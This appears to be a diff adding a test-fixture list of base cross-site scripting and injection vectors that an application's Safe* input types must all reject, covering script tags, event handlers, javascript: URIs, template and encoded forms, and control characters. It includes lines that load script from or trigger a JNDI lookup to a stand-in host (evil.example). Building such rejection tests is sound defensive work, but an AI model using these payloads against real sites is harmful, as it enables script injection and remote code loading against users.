@@ -1,0 +1,119 @@
+# Base vectors for the shared script/markup payload list (doc 07 §4.7).
+# tools/build_payloads.py expands these into xss.txt with encoded/obfuscated variants.
+# Every vector must be rejected by EVERY Safe* type (even the most permissive, SafeChatMessage).
+# One vector per line. Lines starting with `json:` hold a JSON string literal (for control/invisible chars).
+# Do not put SQL-injection or CSV-formula strings here: they get separate lists (S16) with different assertions.
+
+# --- Tags (R1)
+<script>alert(1)</script>
+<SCRIPT>alert(1)</SCRIPT>
+<ScRiPt>alert(1)</sCrIpT>
+<script src=//evil.example/x.js></script>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+</title><script>alert(1)</script>
+< script>alert(1)</script>
+<scr<script>ipt>alert(1)</script>
+<img src=x onerror=alert(1)>
+<img src="x" onerror="alert(1)">
+<IMG SRC=x ONERROR=alert(1)>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<svg><script>alert(1)</script></svg>
+<iframe src="javascript:alert(1)"></iframe>
+<iframe srcdoc="<script>alert(1)</script>">
+<a href="javascript:alert(1)">x</a>
+<a href=javascript:alert(1)>click</a>
+<body onload=alert(1)>
+<input autofocus onfocus=alert(1)>
+<details open ontoggle=alert(1)>
+<video><source onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<link rel=stylesheet href=javascript:alert(1)>
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<style>@import'javascript:alert(1)';</style>
+<div style="background:url(javascript:alert(1))">
+<div style="width: expression(alert(1))">
+<form action=javascript:alert(1)><input type=submit>
+<marquee onstart=alert(1)>
+<base href="javascript:alert(1)//">
+<!--<script>alert(1)//-->
+<![CDATA[<script>alert(1)</script>]]>
+<?xml version="1.0"?><x>1</x>
+<%= 7*7 %>
+<b>bold</b>
+<p>hello</p>
+<br>
+</div>
+Hello<script>
+Priya<
+Sahil>
+5 > 3
+a<b
+
+# --- Event handlers without tags (R2)
+onerror=alert(1)
+onload=alert(1)
+x onmouseover=alert(1)
+" onfocus="alert(1)
+' onclick='alert(1)
+ONCLICK = alert(1)
+
+# --- Script / data URI schemes (R3)
+javascript:alert(1)
+JaVaScRiPt:alert(1)
+java script:alert(1)
+javascript :alert(1)
+vbscript:msgbox(1)
+livescript:alert(1)
+data:text/html,hello
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+data:image/svg+xml;base64,PHN2Zz4=
+
+# --- Template / expression syntax (R4)
+{{7*7}}
+{{constructor.constructor('alert(1)')()}}
+${7*7}
+${jndi:ldap://evil.example/a}
+#{7*7}
+}}{{7*7
+%>hello
+
+# --- Pre-encoded / escaped forms (R6, R7, R8)
+&lt;script&gt;alert(1)&lt;/script&gt;
+&#60;script&#62;alert(1)&#60;/script&#62;
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+&#0000060script&#0000062
+&lt;b&gt;
+javascript&colon;alert(1)
+%3Cscript%3Ealert(1)%3C%2Fscript%3E
+%253Cscript%253Ealert(1)%253C%252Fscript%253E
+%3cimg%20src%3dx%20onerror%3dalert(1)%3e
+<script>alert(1)</script>
+\x3cscript\x3ealert(1)\x3c/script\x3e
+＜script＞alert(1)＜/script＞
+﹤script﹥alert(1)﹤/script﹥
+
+# --- CSS injection (R9)
+expression(alert(1))
+url(javascript:alert(1))
+@import url(evil.css)
+
+# --- Control, null, zero-width, bidi (R5)
+json:"abc\u0000def"
+json:"abc\u0007def"
+json:"line1\u000bline2"
+json:"\u001b[31mred"
+json:"abc\u007fdef"
+json:"ab\u200bcd"
+json:"ab\u200ecd"
+json:"\u202eevil"
+json:"\u2066x\u2069"
+json:"java\tscript:alert(1)"
+json:"java\u0000script:alert(1)"
+json:"<scr\u0000ipt>alert(1)</script>"
+json:"<img\nsrc=x\nonerror=alert(1)>"
+json:"on\u200berror=alert(1)"
